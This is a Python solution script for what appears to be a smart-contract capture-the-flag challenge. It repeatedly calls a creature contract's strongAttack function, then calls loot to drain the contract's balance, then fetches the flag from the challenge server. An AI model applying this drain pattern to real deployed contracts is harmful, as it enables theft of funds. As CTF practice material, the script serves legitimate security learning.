from web3 import Web3
import requests

base_URL = 'http://PROVIDED_IP/'

# Get wallet values
res = requests.get(f'{base_URL}/connection_info')
data = res.json()


web3 = Web3(Web3.HTTPProvider(f'{base_URL}rpc'))

# Provided values
private_key = data['PrivateKey']
account_address = data['Address']
setup_contract_address = data['setupAddress']
target_contract_address = data['TargetAddress']

# Basic setup
setup_contract_abi = [
    {
        "constant": True,
        "inputs": [],
        "name": "TARGET",
        "outputs": [{"name": "", "type": "address"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    }
]

creature_contract_abi = [
    {
        "constant": False,
        "inputs": [{"name": "_damage", "type": "uint256"}],
        "name": "strongAttack",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "punch",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [],
        "name": "loot",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

# Load contracts
setup_contract = web3.eth.contract(address=setup_contract_address, abi=setup_contract_abi)
target_contract = web3.eth.contract(address=target_contract_address, abi=creature_contract_abi)

def exploit():
    # Call strongAttack func() repeatedly to set aggro
    for _ in range(20):
        tx_hash = target_contract.functions.strongAttack(1).transact({'from': account_address, 'gas': 100000})
        web3.eth.wait_for_transaction_receipt(tx_hash)

    # Call loot func() to claim contract's balance
    tx_hash = target_contract.functions.loot().transact({'from': account_address, 'gas': 100000})

exploit()


# Grab flag after exploiting
res = requests.get(f'{base_URL}/flag')

print(res.text)